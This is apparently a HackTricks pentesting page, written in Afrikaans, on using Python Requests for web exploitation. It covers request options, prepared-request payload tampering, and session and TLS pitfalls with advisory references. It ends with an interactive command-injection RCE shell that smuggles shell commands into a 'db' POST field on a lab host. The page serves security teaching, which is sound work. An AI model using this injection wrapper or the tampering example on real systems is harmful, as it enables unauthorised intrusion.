# Webversoeke

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

Hierdie voorbeelde gebruik Requests se gedokumenteerde versoekargumente, response-eienskappe, multipart-lêer-tuples en sessions.<sup>[[1]](#references)</sup> Die `verify=False`-voorbeelde deaktiveer TLS-sertifikaatverifikasie en behoort tot beheerde toetsing beperk te word.<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## Voorbereide versoeke vir payload-beheer

’n `PreparedRequest` stel die finale URL, headers en geënkodeerde body bloot voordat dit gestuur word. Bou dit met `Session.prepare_request()` (eerder as `Request.prepare()`) wanneer sessiekoekies of authentication toegepas moet word; wanneer die prepared-flow ook omgewingsproxy-/CA-instellings moet eerbiedig, voeg dit uitdruklik saam met `merge_environment_settings()`.<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
Dit is nuttig wanneer ’n exploit nie-standaardkodering benodig, of wanneer die payload wat saamgestel is, vergelyk word met die request wat in `response.request` gestoor is. Dit is nie ’n raw-HTTP-primitief nie: Requests stoor headers in ’n hoofletter-onsensitiewe mapping, dus vervang die toewysing van ’n duplikaatnaam die vorige waarde. Gebruik ’n laer-vlak-sender vir misvormde request-reëls of afsonderlike duplikaat-`Content-Length`-/`Transfer-Encoding`-velde wat benodig word vir [HTTP request-smuggling-toetse](../../pentesting-web/http-request-smuggling/README.md).<sup>[[1]](#references)</sup>

## Sessie-isolasie, implisiete geloofsbriewe en TLS-toestand

’n Sessie vertrou by verstek op omgewingskonfigurasie. As geen eksplisiete verifikasie verskaf word nie, kan Requests Basic-geloofsbriewe vanaf `.netrc` verkry; dit kan ook proxy-konfigurasie en CA-bundelpaaie vanaf omgewingsveranderlikes invoer. Vir skrifte wat aanvaller-beheerde URL's haal, deaktiveer daardie implisiete invoere en konfigureer slegs die beoogde lab-proxy/CA eksplisiet. Vrystellings voor 2.32.4 kon `.netrc`-geloofsbriewe vir die verkeerde host kies wanneer ’n kwaadwillig saamgestelde URL verskaf is, terwyl `Session.trust_env = False` die gedokumenteerde oplossing is wanneer ’n opgradering onmoontlik is.<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
Hou ’n sessie wat `verify=False` gebruik apart van sessies wat geverifieerde TLS vereis. In Requests voor 2.32.0 kon ’n verbinding wat eers met `verify=False` geopen is, vir latere same-origin requests hergebruik word, selfs wanneer daardie requests `verify=True` gespesifiseer het; opgradering herstel daardie pool-state-kwessie, maar isolasie maak exploit-skripte ook makliker om te oudit.<sup>[[5]](#references)</sup>

## Betroubare exploit-lusse

Requests het geen verstek-timeout nie. ’n `(connect, read)`-timeout is nie ’n totale wall-clock-sperdatum nie: die read-komponent beperk hoe lank die client tussen ontvangde grepe wag. Deaktiveer outomatiese redirects wanneer ’n teiken `Location` beheer, en valideer elke hop voordat ’n nuwe request gestuur word; indien redirects geaktiveer is, inspekteer `response.history`. Vir groot of vyandige responses, gebruik `stream=True`, itereer in begrensde chunks, en maak die response met ’n context manager toe sodat die pooled connection vrygestel word.<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## Python cmd om 'n RCE uit te buit

Die command loop subklassifiseer Python se `Cmd`; sy `default`-metode hanteer onbekende command-voorvoegsels, `cmdloop` stuur invoerlyne aan, en `re.DOTALL` laat die extraction-patroon oor nuwe lyne strek.<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Requests Developer Interface](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — Ondersteuning vir lyngeoriënteerde command interpreters](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Bewerkings met regular expressions](https://docs.python.org/3/library/re.html)
- [4] [Requests kwesbaar vir `.netrc` credentials leak via malicious URLs](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [Requests `Session`-objek verifieer nie requests nadat die eerste request met `verify=False` gemaak is nie](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
